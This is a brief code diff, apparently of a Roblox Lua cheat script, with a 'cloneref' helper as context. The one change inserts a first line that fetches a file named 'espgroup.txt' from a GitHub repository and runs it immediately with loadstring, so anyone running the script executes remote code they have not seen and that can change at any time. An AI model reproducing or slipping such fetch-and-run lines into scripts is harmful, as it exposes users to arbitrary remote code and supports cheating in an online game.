@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KingScriptAE/No-sirve-nada./refs/heads/main/espgroup.txt"))()
 local cloneref = (cloneref or clonereference or function(instance: any)
 return instance
 end)
